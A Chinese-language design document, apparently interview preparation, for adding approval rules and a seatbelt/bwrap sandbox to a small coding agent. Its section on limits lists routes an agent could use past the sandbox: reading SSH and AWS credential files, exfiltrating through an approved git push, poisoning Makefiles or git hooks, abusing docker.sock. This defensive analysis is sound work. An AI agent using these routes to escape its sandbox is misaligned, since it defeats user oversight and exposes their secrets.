4. **"你有『总是允许』。到底记住的是什么，为什么这是设计里最难的一个判断？"** 强答案：记忆**原始字符串**是那个直觉实现，而它在两个方向上都是错的。太窄：模型改一下空白或 flag 顺序，用户就要为一件他们已经批准过的事再被问一遍，这训练他们狂按 `a`。只以 argv0 为键又太宽：批准 `rm -rf ./build` 就等于授权了 `rm -rf /`。我以 `(basename(argv0), 第一个非 flag 参数)` 为键——`npm:test`、`git:push`——它对格式稳定，但对目标不稳定。这仍然是过度授权：为 `origin feature` 批准的 `git:push` 也覆盖了 `origin main`。我会把这个取舍明说出来而不是糊过去，并指出授权是 session 作用域的、且刻意不持久化到磁盘（持久化的授权正是你最终得到一个永久批准的 `curl` 的方式），以及 DENY 规则永远不能被 session 授权——只有 ASK 是可降级的。

5. **"你把强制点放在哪儿了，为什么不放在分发点？"** 强答案：显而易见的钩子是 `agent.py:436`，那一行调用 `tool.execute(**arguments)`。我刻意没用它，因为在 `acp/__init__.py:146-160` 有**整个 agent 循环的第二份、已经漂移的副本**，它在 `:157` 有自己的 `await tool.execute(**args)`——放在 `agent.py` 的闸门在 ACP server 里会静默缺席，而这正是"安全控制在一条代码路径上存在、在另一条上不存在"那一类 bug。我改为在*构造*时包装，位置是 `cli.py:414-427`，两个入口点都在那里构造工具。结果：两个循环里一行都不用改，而且 MCP 和 skill 工具也一并继承了这道闸门。一般原则：当调用点可能繁殖时，把安全控制放在对象被创建的地方，而不是被调用的地方。唯一一件真的没法放进 wrapper 的是沙箱本身——它必须改变子进程被 spawn 的方式，所以它注入进 `BashTool.__init__`，并在三个 `create_subprocess_*` 位置上生效。

6. **"seatbelt profile *拦不住*什么？"** 强答案，而且愿意回答这个问题本身就是重点。(1) **读。** profile 是 `(allow default)` 加上写入/网络的拒绝，所以 `cat ~/.ssh/id_rsa` 和 `~/.aws/credentials` 都能成功——实测过。配合网络拒绝，你得不到直接外传，但"先读、再写进 workspace、之后一次被批准的 `git push`"是一条真实的路径。(2) **workspace 内部的写入按设计不受约束**——污染一个 `Makefile`、`conftest.py` 或 `.git/hooks/pre-commit`，让*之后某个未沙箱化的*进程去执行它，是一条直白的逃逸路线。(3) **通过 unix socket 的 confused deputy**——我必须放行 `network-outbound (remote unix-socket)`，否则 DNS 和工具链都会坏，而同一条权限也够得着 `/var/run/docker.sock`，在那里可以让一个容器往任何地方写。(4) `sandbox-exec` 已被 Apple 正式弃用，其确切的 SBPL 语义没有文档——`(remote ip "localhost:*")` 这条规则放行*全部*出站（实测）就很好地说明了：写出一份读起来正确、实际上不正确的 profile 有多容易。(5) 后台 shell（`bash_tool.py:354`）会活过批准它的那一轮；沙箱跟着进程走，但用户"我只批准了一条命令"的心智模型跟不上。(6) 这一切都不阻止资源耗尽——没有 rlimit，没有 cgroup。

## 前置条件

1. `mini_agent/tools/file_tools.py:72,164,221` —— 在任何约束检查有意义之前，这三个工具构造函数里的 `Path(workspace_dir).absolute()` 都必须改成 `.resolve()`；macOS 上一个根在 `/tmp` 的 workspace 会让 `.absolute()` 和内核对"workspace 到底是什么"产生分歧。

2. `mini_agent/tools/bash_tool.py:225,235` —— `workspace_dir` 是 `str | None`，而 `tests/test_bash_tool.py:15` 用 `BashTool()` 不带 workspace 来构造；沙箱层必须为 `workspace_dir=None` 定义行为（沙箱禁用）而不是崩溃，否则现有测试套件在 import 时就挂了。

## 明确不做

不做：配置文件形式的规则 DSL（规则就留在 `rules.py` 里的一个 Python 列表）、跨 session 持久化的授权、逐工具的 MCP 策略（所有 MCP 工具统一坍缩成一个 ASK）、seccomp/landlock（Linux 上只用 bwrap 的 namespace 标志，而且那条路径由探针把关、在我机器上没测过——macOS 没有 `bwrap`）、针对 CPU 和内存的 rlimit/cgroup、任何 Windows 相关的东西，以及一个真正的 shell 文法（不用 `bashlex`/`tree-sitter`）。我会对面试官说的那句话："这东西的生产版本会带一门策略语言、持久化授权和一个正经的 bash 文法——这三样我全跳过了，因为它们都不改变我要演示的机制。我没有跳过的是 fail-closed 路径和沙箱验证探针，因为那才是做错了也不出声的地方。"

## 代码量

新增约 1,300 LOC（sandbox 约 280，parser 约 230，policy+rules 约 200，prompter 约 120，guard+confine 约 120，测试约 230，探针脚本约 120），外加 `bash_tool.py`、`file_tools.py`、`cli.py`、`config.py` 上约 60 行改动。`agent.py` 和 `acp/__init__.py` 零行改动。

## 工期

5-6 天。第 1 天：parser + 引号扫描器 + 语料测试（先写表格，由它驱动 parser）。第 2 天：策略引擎、规则、session 授权。第 3 天：seatbelt profile 和验证探针——整天都排给它，profile 是经验性的，每条规则都要试射。第 4 天：guard wrapper、约束、四处调用点的改动、TTY prompter 与 Esc 线程的协调。第 5 天：`sandbox_probe.py`、bwrap 路径、带诚实局限一节的 README。第 6 天：留给你还没发现的那些 seatbelt 意外。
